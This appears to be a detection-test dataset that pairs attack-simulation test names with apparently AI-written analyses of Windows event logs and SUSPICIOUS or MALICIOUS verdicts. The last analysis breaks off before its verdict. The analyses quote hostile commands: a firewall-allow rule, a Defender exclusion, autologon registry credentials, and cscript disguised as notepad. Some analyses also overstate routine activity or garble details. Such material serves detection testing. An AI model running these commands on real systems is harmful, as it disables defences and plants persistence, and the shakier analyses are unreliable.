### Conclusion:
Based on the logs' evidence, there are a series of activities that appear suspicious, particularly the command to echo and check for existence of a file in a Temp directory leading to the execution of Akagi64.exe. These activities typically aren't found in regular user behavior without a scheduled operation or known IT task.

**Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed:
1. **Immediate Steps**:
   - Consider isolating the machine from the network to prevent any potential spread if this activity is indeed malicious.
   - Examine the file `Akagi64.exe` in detail, potentially using sandbox analysis or antivirus scanning.

2. **Forensic Analysis**:
   - Further investigation is required on the user ""SERVER002\\admin_test"" to confirm whether actions were user-driven or automated.
   - Check for any unusual outbound connections proceeding these logged events to rule out exfiltration of data.

3. **Review and Monitor**:
   - Review any related system policy or EDR solutions' patterns or alerts that might relate to this execution.
   - Monitor the system closely for any repeating or similar behavior and validate legitimate system updates through trusted channels."
InstallUtil class constructor method call,"Based on the analysis of the provided logs, several notable activities stand out that may indicate suspicious behavior:

1. **Time Change Events**: In both the security and system logs, events (Event IDs 4616 and 1 from multiple sources) indicate that the system time was adjusted. Although time change events can occur legitimately for various reasons (e.g., daylight savings, time synchronization with time servers), frequent and unexpected changes could potentially be indicative of an attacker trying to manipulate logs or system behavior.

2. **PowerShell Activity**: There are multiple PowerShell events recorded. Notably, the execution includes code that compiles a .NET assembly (`data.004.dll`) and attempts to execute it using the InstallUtil utility. This behavior is characteristic of a technique known as ""Living off the Land"" (LotL) attacks, where legitimate system tools are used for malicious purposes. The PowerShell script (`InstallUtilTestHarness.ps1`) and the execution of the .NET assembly could be attempts to execute payloads with elevated privileges or bypass security controls.

3. **System and File Activity**: There are records of ""csc.exe"" and ""cvtres.exe"" being used to compile resources, followed by the use of ""InstallUtil.exe"". These actions are typically not common for standard user operations and may indicate the compilation and execution of a potentially malicious .NET payload.

4. **Unusual Process Execution**: Multiple executions of `wevtutil.exe`, `hostname.exe`, and `whoami.exe` are observed. While these could be benign in certain administrative contexts, their execution sequence might suggest reconnaissance or system information gathering, which can be a form of pre-attack activities.

5. **Microsoft Edge Update Activity**: Frequent and varied calls to Microsoft Edge Update executables are seen in the logs. While these may relate to routine update operations, the degree and nature of invocations (including different command-line parameters) suggest further scrutiny, especially considering other suspicious operations observed.

**Assessment**: 
The combination of suspicious PowerShell activities, system binaries compilation, time adjustments, and frequent execution of utilities suggests potential malicious activity. The activity pattern aligns with common attack tactics such as privilege escalation, reconnaissance, or deployment of a payload via compiled code.

**Resolution**: 
**MALICIOUS** - The activities strongly suggest malicious intent, given the nature of PowerShell execution, compilation and execution of .NET payloads, and other recon activities.

**Guidance**:
- Immediately isolate the affected system to prevent further potential compromise or spread.
- Conduct a detailed forensic examination of the system to trace all activities, specifically focusing on PowerShell logs, filesystem changes, and compiled resources.
- Review any changes to critical system settings or time configurations.
- Analyze any additional correlating alerts or logs from network or endpoint monitoring solutions.
- Consider updating detection rules to alert on similar PowerShell and process activity patterns.
- Reset credentials or access keys that might have been exposed during the incident.
- Follow up with comprehensive endpoint protection measures and user awareness training."
Allow Executable Through Firewall Located in Non-Standard Location,"### Analysis

The provided logs span several channels, highlighting different activities on the system. Let's break them down by log type:

#### **System Log:**
1. **Kernel-General Events:**
   - **EventID 24 and 1 (Time Changed Events):** The logs indicate time changes adjusted by `svchost.exe`. These appear to be normal system operations related to time synchronization with `time.windows.com`. No malicious indicators are present in these events.

2. **Time Service Event:**
   - **EventID 35:** The time source for synchronization is `time.windows.com`. This is a standard activity and does not indicate malicious behavior.

#### **Application Log:**
1. **Edge Update Service:**
   - Multiple entries indicate the `edgeupdate` service stopped. This could suggest routine update operations or possible interruptions, but without additional context, this does not necessarily indicate malicious activity.

#### **Windows PowerShell Log:**
1. **PowerShell Activity:**
   - The logs show a PowerShell command was executed: 
     ```
     powershell.exe & {Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\fileTest.exe"" -Destination ""C:\Users\$env:UserName"" -Force
netsh advfirewall firewall add rule name=""file Test"" dir=in action=allow program=""C:\Users\$env:UserName\fileTest.exe"" enable=yes}
     ```
   - This PowerShell script is highly suspicious. It involves copying a file (`fileTest.exe`) to a user directory and then adjusting the firewall to allow traffic for this executable. This behavior is indicative of a possible attempt to establish persistence or backdoor access.

#### **Sysmon Log:**
1. **Process Creation Events:**
   - **Use of `wevtutil.exe` and `conhost.exe`:** Numerous instances of these processes were launched by `admin_test`. `wevtutil.exe` is commonly used to manipulate event logs and is suspicious if not expected.
   
2. **Network Command Shell (`netsh.exe`):**
   - Directly correlates with the PowerShell script. Modifying firewall rules for a specific executable which was just copied is another red flag for potential malicious activity.
   
3. **Various Edge Update Executions:**
   - `Microsoft Edge Update` processes appearing in the logs suggest routine update activities. While voluminous, there's no direct indication of being malicious.

### Overall Assessment

- **Suspicious Indicators:**
  - Unusual PowerShell activity involving file copying and firewall modification raises serious concerns about malicious intent.
  - Repeated invocation of administrative tools like `wevtutil.exe` hints at possible event log tampering.

### Resolution
Given the indication of potentially malicious activity, notably the suspicious PowerShell commands and firewall modifications, the resolution is labeled as:

**MALICIOUS**

### Recommended Actions
1. **Immediate Investigation:**
   - Conduct a deeper analysis of the `fileTest.exe` to determine its nature and potential threats.
   - Review security policies and ensure strict least privilege for running scripts and modifying system settings.
   
2. **Incident Response:**
   - Isolate the affected system from the network to prevent further compromise.
   - Collect additional context such as user access logs, network traffic, and seek additional forensic evidence.

3. **Monitoring and Hardening:**
   - Enhance monitoring of PowerShell activities.
   - Check for similar activities across other systems to identify potential lateral movement by an attacker.

Implementing these measures will help mitigate any immediate threats and aid in the investigation of potential persistence mechanisms or additional compromise vectors."
LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"Upon reviewing the provided Windows event logs, several activities are notable and suggest the potential for malicious behavior. Below is a detailed analysis of the logs:

### Anomalous Behavior:
1. **Repetitive Execution of `wevtutil.exe` and `conhost.exe`:** 
   - The logs show repeated execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. While `wevtutil.exe` (Windows Event Utility) is a legitimate tool, it is often exploited by attackers to either clear event logs or export them for later analysis.
   - `conhost.exe` is a legitimate process used by Windows GUI command prompts. Its frequent execution in close succession with `wevtutil.exe` suggests automation or scripting.

2. **Suspicious Registry Modifications:**
   - The execution of `cmd.exe` with registry modification commands is concerning. This involves setting auto logon registry keys under the `HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon` path to configure auto logon with credentials (`DefaultUserName`, `DefaultDomainName`, and `DefaultPassword`).
   - Such modifications can be indicative of an attempt to maintain persistence on the machine through automatic login at startup.

3. **Execution of Utilities Like `whoami.exe` and `hostname.exe`:**
   - The execution of `whoami.exe` and `hostname.exe`, while themselves not inherently malicious, could be used by an attacker trying to gather environment information without raising suspicion.

4. **High Integrity Execution:**
   - The processes are executed at a high integrity level under the `SERVER002\admin_test` user, indicating administrative privileges.

5. **Parent Process:**
   - The parent process for several suspicious activities is `wsmprovhost.exe`. This executable is involved in PowerShell remoting. Its involvement suggests potential exploitation for remote command execution.

### Malicious Indicators:
- The combination of `wevtutil.exe` and registry modifications strongly suggests malintent, where an attacker is attempting to cover their tracks and establish persistence.
- Modifying registry keys for auto logon, especially with plain text credentials, is a significant security risk and an indicator of compromise.

### Assessment and Resolution:
**Resolution: MALICIOUS**
- The logs display clear signs of malicious activities aimed at maintaining persistence and possibly escalating privileges or moving laterally within the network. The registry modifications, in particular, provide evidence that an unauthorized entity may have tried to front-load credentials for automatic logon, which is a known attacker tactic.

### Guidance on How to Proceed:
1. **Immediate Action:**
   - Isolate the affected system (`Server002`) from the network to prevent further malicious activities and lateral movement.
2. **Investigation:**
   - Conduct a thorough forensic investigation to identify the extent of compromise, focusing on analyzing registry changes, scheduled tasks, and other persistence mechanisms.
   - Review and search the system for any scripts or tools that the attacker may have left to facilitate their access or evade detection.
3. **Remediation:**
   - Remove or revert the unauthorized registry modifications to prevent auto logon.
   - Change credentials for any affected accounts to protect against unauthorized access.
4. **Monitoring:**
   - Increase the monitoring of surrounding systems and the network for similar behavior and potential indicators of additional compromises using EDR (Endpoint Detection and Response) tools.
5. **Hardening and Future Prevention:**
   - Implement a more robust security posture using least privilege principles, ensuring administrative operations are tightly controlled and monitored.
   - Educate administrative users on identifying signs of compromise and the importance of secure credential handling.

Taking these steps will help in mitigating the current threat and strengthening defenses against future incidents."
Windows HideSCAPower Group Policy Feature,"### Analysis:

Upon reviewing the provided log entries, here are the observations and assessments of potential suspicious activities:

1. **Application Log:**
   - The entries related to `edgeupdate` indicate that the Edge Update services have stopped. There is nothing inherently suspicious about services stopping unless it is in conjunction with other unusual behaviors, but on its own, this seems benign.

2. **Security Log:**
   - The events with ID `4616` related to time change seem legitimate as they describe a system time change by `svchost.exe` with the user `LOCAL SERVICE`. This is typically normal system behavior.

3. **Sysmon Log:**
   - The logs involve frequent execution of processes `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` by `SERVER002\admin_test` with a high integrity level, indicating administrative privileges were used. These processes in themselves are not inherently malicious, but their usage can be leveraged in attacks if out of context.
   - Notably, there's a command executed by `cmd.exe`: 
     ```
     ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAPower /t REG_DWORD /d 1 /f
     ```
     This command modifies the registry to hide power options, which is a suspicious activity often carried out by unauthorized users to limit the capability of shutdown or restart options, indicating an attempt to change user policies possibly to maintain persistence or obfuscate actions.
   - Multiple executions of `MicrosoftEdgeUpdate.exe` processes seem normal for periodic updates but should be scrutinized if any abnormal network activity occurs with them.
   
4. **System Log:**
   - The timing and time source events correspond with normal system synchronization activities and seem benign.

### Conclusion:

- **Suspicious Indicators:**
  - The `cmd.exe` command modifying the registry to alter user policy settings without clear justification is suspicious and warrants further investigation. This is a classic indicator of suspicious activity because it impacts user interface behaviors.

- **Overall Assessment:**
  - The logs do not provide definitive evidence of a malicious activity due to the lack of broader context around these events or associated network logs. However, the registry modification stands out as an anomaly needing the source and intent behind it clarified.

### Resolution: 
- **Resolution: SUSPICIOUS** 

The logs show activity that merits further investigation to determine its purpose and whether it ties into a larger indication of malicious intent. Review additional context such as user account activity, origin of the registry changes, and any network behavior during this timeframe. Consider containment and monitoring actions until further conclusions are reached."
DCShadow (Active Directory),"### Analysis of Logs

Upon analyzing the provided Windows event logs, I have identified several key points of concern suggesting potential malicious activity. Below is a detailed analysis based on the logs:

#### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**:
    - Multiple instances of `powershell.exe` running command lines that involve script execution using PsTools (script.exe), a tool suite known for its capabilities to manage remote systems.
    - The specific PowerShell command is attempting to simulate a DC (Domain Controller) server, use `lsadump::dcshadow` to modify the `badpwdcount` attribute for an object (possibly an AD account like `bruce.wayne`), and then trigger a replication. This behavior is highly suspicious and indicative of an attempt to perform a DCShadow attack, which is a known method used to inject data into Active Directory.
    - Commands are being run with high integrity, suggesting administrative privileges are being used.

2. **Unusual Execution of System Processes**:
    - We see processes such as `conhost.exe` and `cmd.exe` being utilized in sequence with PowerShell, possibly as part of this scripted attack to handle output or logs.
    - Usage of `whoami.exe` and `hostname.exe` might be used to gather information about the system and context the scripting operates in.

3. **Frequent `wevtutil.exe` Executions**:
    - The repeated execution of `wevtutil.exe` may indicate attempts to modify or clear event logs to hide malicious activities or footprints.

4. **Edge Update Executions**:
    - Multiple `MicrosoftEdgeUpdate.exe` processes are spawned. While some Edge update activity is normal, the frequency and context might warrant further exploration to ensure they were not leveraged as a persistence mechanism or false flag distractions.

#### Indicators of Malicious Activity:
- The PowerShell command involves classic Red Team and malicious use cases using advanced methods like `dcshadow`. This indicates an effort to manipulate AD structure or configurations without detection.

### Assessment

Based on the log analysis, there is clear evidence of potentially malicious activity. The presence of a DCShadow attack in the execution logs, involving the manipulation of Active Directory attributes, suggests an advanced attack technique aimed at gaining or maintaining unauthorized control of the environment.

### Recommendation:
- **Immediate Containment**: Disconnect the CEO's machine from the network to prevent further spread or data exfiltration.
- **Further Investigation**: Conduct a thorough forensic investigation on the CEO's machine for additional indicators of compromise, especially any persistence mechanisms.
- **Active Monitoring**: Enable detailed monitoring and alerting for unusual Active Directory changes or PowerShell activity across the network.
- **Incident Response**: Implement incident response protocols to mitigate the impact of this breach, including notifying concerned departments and authorities if necessary.

### Resolution
- **MALICIOUS**: The logs provide clear evidence of malicious activity. The use of a scripted PowerShell attack with DCShadow is a strong indicator of a compromise. Immediate action must be taken to contain and remedy this security breach."
Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"Upon reviewing the provided logs, several key observations indicate potential malicious activity or compromise:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - `wevtutil.exe` is a legitimate Windows utility that manages event logs. However, repeated executions of this process can be suspicious, especially if executed by a non-standard user or in a rapid sequence, as seen here.
   - `conhost.exe` is a legitimate console wrapper, but its repeated launching alongside `wevtutil.exe` should be correlated with other suspicious activities.

2. **Anomalies in PowerShell Execution (Events 17982, 17983):**
   - There is a PowerShell command that modifies registry keys related to AutoAdminLogon and sets the DefaultUserName, DefaultDomainName, and DefaultPassword within the registry path `HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon\`.
   - This action configures the system to automatically log in with the specified credentials, which is not a common operation and is often associated with malicious activity aiming to gain persistent access.

3. **Administrative User Context:**
   - The pattern of execution happens under a high integrity level, often suggesting administrative privileges. When paired with the command modifying critical registry paths, it raises concerns about unauthorized privilege escalation or persistence tactics.

4. **Suspect PowerShell Commands from Windows PowerShell Logs:**
   - The Windows PowerShell logs highlight the command setting persistent login credentials, which is often used by attackers to ensure continued access even after rebooting the system.

5. **Indicators in Event Sequence:**
   - The suspicious command line activity, paired with other typical system processes, suggests that an attacker might be leveraging them to disguise malicious scripts.

6. **Microsoft Edge Update Activities:**
   - Although this appears to invoke routine update processes, it's crucial to cross-reference these with external intelligence feeds to ensure they are legitimate, as masquerading under trusted applications could be a stealth tactic.

**Assessment:**
- Based on the Sysmon and PowerShell logs, the modification of AutoAdminLogon and associated registry entries without clear legitimate business justification strongly indicates a malicious activity.

**Resolution: MALICIOUS**
- **Threats Identified:** Unauthorized registry changes for automatic logon, potential persistence mechanisms, administrative command execution without clear legitimate business context.
- **Risks:** Unauthorized access, potential data exposure, system control by an external actor, potential lateral movement.
  
**Guidance on Next Steps:**
1. **Immediate Containment:**
   - Suspend the accounts involved (e.g., `SERVER002\admin_test`) until a thorough investigation is completed.
   - Block or isolate the affected machine from the network to prevent further propagation.

2. **Investigation and Forensics:**
   - Conduct a full forensic analysis on `Server002`, focusing on audit trails, especially around altered registry keys.
   - Check for any unauthorized user accounts and changes, and review failed/successful login attempts in Security logs.
  
3. **Remediation:**
   - Roll back unauthorized registry changes.
   - Consider re-imaging the host after ensuring data backup and integrity.

4. **Security Enhancements:**
   - Set up alerting mechanisms for suspicious PowerShell activity and high-frequency executions of sensitive utilities like `wevtutil.exe`.
   - Implement a stronger access control policy and mandatory use of multi-factor authentication.

5. **Communication:**
   - Notify senior management regarding potential impacts.
   - Engage an incident response team if necessary for broader ramifications on security posture. 

6. **Monitor:**
   - Continuously monitor similar patterns across the network to detect other potential compromises."
Tamper with Windows Defender Evade Scanning -Folder,"Based on the provided logs across the PowerShell, Application, Security, Sysmon, and System logs, here is the detailed analysis of any suspicious or anomalous behavior:

### Analysis:

1. **PowerShell Log:**
   - The PowerShell logs show the execution of a PowerShell script that adds an exclusion path to the Windows Defender via `Add-MpPreference -ExclusionPath ""C:\\Temp""`. This activity is suspicious because tampering with antivirus settings (particularly exclusions) can be used to allow malware to avoid detection. The fact that it targets a Temp directory is particularly notable, as this is often used for temporary storage by malicious programs.

2. **Application Log:**
   - The `edgeupdate` service logs show repeated starts/stops, which may indicate regular update activity for Edge. There are no direct indicators of malicious activity in these entries alone.

3. **Security Log:**
   - Multiple logon events (ID 4624) and privilege use events (ID 4672) are logged for the `admin_test` account. The use of elevated privileges, as indicated by entries for privileges such as `SeDebugPrivilege`, is something to be wary of, but not definitive on its own.
   - There are time change events (Event ID 4616). Time manipulation could be significant if other anomaly logs are present, though no time progressions indicate machine time manipulation at this point.

4. **Sysmon Log:**
   - There are entries indicating processes such as `powershell.exe`, `wevtutil.exe`, and `conhost.exe`. The presence of these utilities is normal if expected for administrative tasks, but without context or unusual usage patterns, they are not alone indicative of an issue.
   - High integrity level processes are being spawned by `admin_test`, and several processes related to `MicrosoftEdgeUpdate` are being executed, possibly indicating normal software update activity.

5. **System Log:**
   - Time changes are logged, which correspond to actions noted in the Security logs. Again, might be normal unless used in conjunction with other indicators.

### Assessment:

The most significant finding across these logs is the PowerShell command that sets the exclusion path for Windows Defender using `Add-MpPreference -ExclusionPath ""C:\\Temp""`. Setting an exclusion path can be an indicator of malicious intent as it may be used to hide malicious files from security scans. However, without additional context or corroborating evidence from other logs (e.g., files being dropped in the `C:\Temp` folder or known bad hash values), this action alone is not definitively malicious, but it is certainly suspicious and warrants further investigation.

### Resolution:

**SUSPICIOUS**

### Guidance:

- Further investigation is needed, particularly around the PowerShell activity:
  - Check the file contents and actions inside the `C:\Temp` directory.
  - Review user activity, specifically the `admin_test` user's process history, to understand if the user performed this action directly or if it was through a potential compromise.
  - Monitor and audit further changes to system settings and security policy alterations, focusing on PowerShell usage and antivirus configurations.
- Conduct threat hunting for any unusual network connections or file transfers associated with this timeline.
- Consider implementing enhanced logging/alerting for changes to Windows Defender settings in the future."
Masquerading - cscript.exe running as notepad.exe,"Based on the provided logs from the CEO's machine, here is an analysis identifying any suspicious or anomalous activities:

1. **Windows Updates and Security Updates**:
   The Windows event logs show multiple entries related to Windows Update operations, specifically the Security Intelligence Update for Microsoft Defender Antivirus. These activities include updates initiated and completed successfully. There is nothing unusual or malicious about security updates.

2. **Process Execution (Sysmon Logs)**:
   - There are instances of common Windows utilities being run (e.g., `hostname.exe`, `whoami.exe`, `cmd.exe`, `svchost.exe`, etc.). These are generally benign processes. However, the context in which they are used needs to be analyzed.
   - A specific Process ID `2496` shows `cmd.exe` being used with a command line: `cmd.exe /c copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y & cmd.exe /c %APPDATA%\notepad.exe /B`. This command copies `cscript.exe` to the AppData folder under the guise of `notepad.exe`, then executes it. Renaming and executing a scripting host under a misleading name could indicate an attempt to evade detection and should be considered suspicious behavior.
   - The execution of `notepad.exe` from the `AppData\Roaming` directory is unexpected because `notepad.exe` should not reside there. This action is followed by executions of typical processes, potentially masking the execution of scripts or other operations.
   
3. **Command Execution Context**:
   - The processes related to this suspicious operation were executed by the user `SERVER002\\admin_test`, and not `NT AUTHORITY\\SYSTEM`. Such user executions could indicate a user-driven or script-driven tactic to escalate privileges or execute unauthorized actions.
   
4. **Summary of Potentially Suspicious Indicators**:
   - Usage of command line (`cmd.exe`) to rename and execute a scripting engine (`cscript.exe`), masked as `notepad.exe`.
   - Execution of possibly altered or renamed critical processes in user directories, which may not typically reside or execute from there.

5. **Recommended Actions**:
   - Further investigate the circumstances and source of `cmd.exe` command execution.
   - Determine any resulting impacts or unauthorized changes made by the execution of `notepad.exe` in the user’s AppData directory.
   - Review if there are any unauthorized scripts or suspicious files residing in other user-accessible directories.
   - Implement stringent monitoring of script host execution and ensure it is prevented from user-writable directories unless justified.

**Resolution**: **SUSPICIOUS** - The logs contain activities that do not look typical or right and should be subject to deeper investigation. The potential misuse of known system utilities and the renaming of a script host to blend in with legitimate applications warrant further scrutiny."
Set-Up Proxy Server,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

**System Log Analysis**:
1. **Time Change Event** - Multiple events indicate a system time change by svchost.exe. While legitimate services can cause time changes, unauthorized changes can be a red flag for attacks like time stomping. However, the process involved is svchost.exe, which is commonly used by the system, making it less alarming on its own.
2. **Windows Update** - The event related to a security update for Microsoft Defender Antivirus seems legitimate and is a normal system operation.

**Security Log Analysis**:
1. **Event ID 4616 – System Time Changed**: This repeats what was observed in the system logs. There is no evident malicious user activity since the changes are tied to the LOCAL SERVICE account.
2. **Event ID 4624 – Logon**: This logon event is by the SYSTEM account via Advapi, which is typical for scheduled tasks/services.
3. **Event ID 4672 – Special Privileges Assigned**: SYSTEM has been granted privileges. While SYSTEM has significant privileges, this is normal unless anomalies indicate unauthorized use.

**Application Log Analysis**:
- **Defender State**: Indicates Windows Defender is active, which is benign.

**Sysmon Log Analysis**:
1. **Multiple Executions of wevtutil.exe and conhost.exe**: This tracks event management and console host processes, likely controlled by the ""admin_test"" user. While unusual in bulk, this doesn't instantly raise concerns without context.
2. **Execution of cmd.exe with a Registry Modification Command**: An event logs a command setting a proxy in internet settings, which could indicate misconfiguration or malicious activity (like proxy settings modification by malware). This, combined with high integrity level execution, is suspicious if it was not a legitimate admin action.
3. **Process Chain of whoami.exe, cmd.exe, and reg.exe**: The presence of `whoami.exe` running followed by `cmd.exe` is indicative of user reconnaissance, likely looking for privilege checks. Admins might use these, but repeated or unexplained use by non-admin users can signify malicious intent.

**Assessment & Conclusion**:
- **Suspicious Activity**: The modification of registry settings concerning proxy details stands out as potentially suspicious behavior, especially if it's not documented as planned or typical admin activities.
- **Benign Activities**: The Windows Defender update and SYSTEM activities seem standard and routine.

**Recommendation**:
- Conduct additional investigation into the origin of the registry setting change to see if it aligns with legitimate administrative changes. Review who scheduled the command and if it's part of authorized scripts.
- Verify with the administrator if there's been any recent need for mass changes involving utilities like `whoami.exe` and `reg.exe`, or if there's suspicion of user activity.

**Resolution**:
The logs fall into the category of **SUSPICIOUS**. Further investigation is needed to ascertain the legitimacy of the registry changes."
Registry-free process scope COR_PROFILER,"Upon analyzing the log entries, several observations can be made:

1. **PowerShell Activity:**
   - Several PowerShell commands are executed, involving environment variables such as `COR_ENABLE_PROFILING` and `COR_PROFILER` being set. The environment variable `COR_PROFILER_PATH` points to a DLL located in a temporary directory (""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll""). This behavior is suspicious as it indicates the potential usage of a .NET Profiler to inject or hook into a process for potentially malicious purposes. The correlation between the PowerShell execution and this profiler setup suggests possible exploitation or injection attempts.

2. **Process Execution:**
   - Multiple Sysmon log entries show processes being launched, such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and several PowerShell instances. While some of these executables are typical Windows utilities, in the context of other suspicious activities, they could be part of process enumeration or lateral movement efforts.

3. **Execution of `HOSTNAME.EXE` and `whoami.exe`:**
   - These are harmless system utilities; however, their execution in close sequence with potentially suspicious activities could indicate initial steps of reconnaissance within the environment.

4. **Microsoft Edge Update Activity:**
   - A large number of logs related to Microsoft Edge Update processes (both main and setup executables) are observed. These processes largely appear legitimate, pertaining to updating Microsoft Edge. No evidence of tampered files or anomalous command lines was found surrounding these entries. This activity seems benign and part of legitimate software update actions.

5. **DLL Injection:**
   - The logs indicate that PowerShell scripts are being used in conjunction with environment variables to attempt DLL injection using a specific CLSID. This type of activity is often indicative of attempts to gain unauthorized control over a process.

6. **EdgeUpdate Service Stops:**
   - Two entries show 'Service stopped' for the `EdgeUpdate` service. This may need further investigation to ensure it's part of routine operational behavior or tied to other ongoing Microsoft Edge update processes.

**Assessment:**

The logs suggest possible malicious activity due to the .NET Profiler being set up in a suspicious context. The PowerShell execution with `COR_PROFILER_PATH` to a custom DLL in a temporary directory, combined with the overall execution pattern, strongly indicates malicious intent. The precision and method of invoking environment variables, coupled with powershell.exe launching processes tied to a potentially unknown DLL, augment this assessment.

**Resolution: MALICIOUS**

**Guidance:**
- Isolate the affected host to prevent any further potential spread of malicious payloads or exfiltration of data.
- Conduct a thorough forensic investigation to determine the full scope and impact of the intrusion.
- Analyze the custom DLL involved and any associated process memory dumps to identify its purpose.
- Review the system's security configurations and apply patches or updates.
- Notify key stakeholders and prepare for possible PR implications if sensitive data is involved.
- Enhance monitoring and implement alerts for similar patterns in other systems."
Dynamic API Resolution-Ninja-syscall,"Upon analyzing the Windows event logs related to the CEO's machine, the following indicators of potential malicious activity have been identified:

### Anomalous Activity Identified:
1. **PowerShell Execution**: The PowerShell logs show a script executed as part of `powershell.exe` that starts an executable, `ninja_syscall1.exe`, from a temporary directory. This is suspicious primarily because:
   - It uses PowerShell to launch an executable from a user’s temp directory, which is a common technique for malware.
   - Parts of the command involve checking for the existence of a log file and potentially cleaning up any traces (i.e., removing `hello.log`), suggesting an attempt to cover tracks.
   
2. **Sysmon Logs**: The Sysmon logs confirm the execution of `ninja_syscall1.exe` through PowerShell:
   - The process tree shows that PowerShell was initiated in a high-integrity context by the user `SERVER002\admin_test`.
   - `ninja_syscall1.exe` is launched from the `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\` directory, which belongs to an administrative user context.
   - The execution context and the temporary folder origin make this executable particularly suspect, as legitimate applications rarely operate in this manner.

3. **Security Logs**: Multiple failed read operations on potentially sensitive credential objects in the Security logs:
   - This might suggest attempted access to sensitive information or accounts, although a failed access could mean various things technically; combined with other logs, it is suspicious.

### Indicators of Malicious Activity:
- **Execution of Unrecognized Executable (`ninja_syscall1.exe`)**: The executable does not appear to have a recognized file description, company, or product association. Malware often uses this approach to avoid detection.
- **Cover-up Activity**: The PowerShell script indicates a possible attempt to hide activity by removing potential evidence, indicating planned and potentially malicious activity.

### Final Assessment:
Based on the analysis of executed processes, particularly `ninja_syscall1.exe`, launched by a script seemingly designed to obfuscate activity, and the presence of high-integrity execution of PowerShell scripts seen in conjunction with these events, the behavior is classified as:

**MALICIOUS**

### Recommended Actions:
- **Immediate Quarantine of the System**: To prevent any further unauthorized access or data exfiltration, the system should be isolated.
- **Conduct a Thorough Forensic Analysis**: Collect and analyze more data around the execution chain and check for any lateral movement or additional compromised nodes within the network.
- **Update Security Policies**: To better control execution policies, particularly concerning the use of scripting tools like PowerShell and unsigned or unknown executables.
- **Review and Harden Endpoint Detection and Response (EDR) Configurations**: Ensure that anomalies such as unexpected PowerShell execution are flagged more promptly in future.

These steps should help in assessing the full extent of the compromise and mitigate similar risks moving forward."
Delete a single file - Windows PowerShell,"### Detailed Analysis of Windows Event Logs

### Observations:

1. **PowerShell Activities:**
   - There are multiple PowerShell `EventID 600` logs indicating the use of `powershell.exe` to remove a temporary file `deleteme_data.004` from the TEMP directory. This action is executed with the following command:
     ```
     powershell.exe & {Remove-Item -path $env:TEMP\deleteme_data.004}
     ```
   - This indicates command-line PowerShell activity aimed at deleting a file in the TEMP directory.

2. **Sysmon Logs:**
   - **Process Creation Events:**
     - The frequent execution of `MicrosoftEdgeUpdate.exe` for various update actions like `/update`, `/regsvc`, `/regserver`, `/svc`, `/c`, `/ua /installsource core`, and other update-related activities is notable.
     - `wevtutil.exe` and `conhost.exe` are invoked multiple times but are not uncommon as these are often used by legitimate processes.
     - Other known Windows utilities like `whoami.exe` and `hostname.exe` appear, generally used for gathering system or user information.

3. **Process Details and User Accounts:**
   - Activities predominantly originate from the user `SERVER002\admin_test`, which seems to have administrative privileges given the use of `NT AUTHORITY\SYSTEM` in several actions.
   - `TiWorker.exe` and `TrustedInstaller.exe`, typical processes associated with Windows updates and servicing, were also executed.

4. **Application Logs:**
   - The event shows `edgeupdate` service stopping at the given timestamp, aligning with the multiple execution logs from Sysmon indicating Microsoft Edge Update operations.

### Indicators of Suspicion:

1. **PowerShell Use:**
   - Although removing a temporary file (`deleteme_data.004`) is not inherently malicious, using PowerShell for this action without logging the script name, command name, or specifics raises suspicion as it might be used to conceal other activities.

2. **Frequent Edge Update Executions:**
   - The high volume of Edge update activities within such a short time raises a red flag, specifically if there were no scheduled update during this time and considering no other user activity is logged.

### Assessment and Resolution:

- **Potential Risks:**
  - The PowerShell activity could indicate attempts to cover tracks by removing potentially sensitive data.
  - Rapid-fire Microsoft Edge Update activities, though occurring under System context, should be investigated, especially if it was unscheduled or initiated without user consent.

- **Guidance on How to Proceed:**
  - Verify if the `deleteme_data.004` file was legitimate and review the origin or purpose of its removal using PowerShell.
  - Investigate the administrative account (`SERVER002\admin_test`) for any unusual patterns or recent changes.
  - Confirm the legitimacy and necessity of the Edge update operations during the timeframe.

### Final Resolution: **SUSPICIOUS**

The event logs contain activities that look unusual and warrant further investigation to ensure no malicious activity took place, especially concerning the PowerShell usage and unexplained Edge update operations."
Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"After analyzing the provided logs from the Windows event logs, I've made the following observations and analysis:

1. **Time Modification Events**: There are several Kernel-General and Security-Auditing events (EventID 24) related to modification of system time. The time is moved backwards ((from 17:37:13 to 17:37:09) which is potentially indicative of malicious intent, as altering system time is a common tactic used to hide malicious activities.

2. **Process Execution (Potentially Unusual)**:
   - The Sysmon logs reveal multiple executions of `wevtutil.exe`, `conhost.exe`, and `cmd.exe`. The use of `wevtutil.exe` in a sequence is suspicious if no known legitimate tasks are scheduled. `Cmd.exe` executes a registry modification command which alters HTTP and HTTPS protocol defaults in the Internet Zone map to 0, indicating possible attempts to interfere with security settings related to internet zones.

3. **Privilege Usage**: The use of processes by `SERVER002\admin_test` with high integrity level indicates privileged actions. Monitoring the spawning of processes such as `cmd.exe`, `reg.exe`, and the time adjustments suggest intent to tamper or obfuscate activities. 

4. **EdgeUpdate Service**: The multitude of events involve Microsoft Edge Update processes, which appear standard unless they align temporally with other suspicious activities. The use of legitimate update processes for malicious activity (such as DLL hijacking) is a known method, although in isolation these entries aren't overtly malicious without corroborating evidence.

5. **Network Service Activity**: The presence of `sppsvc.exe` and `WmiPrvSE.exe` in these logs does not immediately indicate malicious activity, but given the company and timing with other events could be opportunistic, especially if no standard update or system change operations are in process.

### Assessment:
The combination of time modifications, suspicious executions of built-in Windows utilities (`cmd.exe`, `wevtutil.exe`), and privilege usage reflects potentially nefarious activities that warrant further investigation, especially since these are all indicative of tactics used to alter, bypass, and suppress host-level auditing and security features. 

### Resolution:
Considering the elements observed:
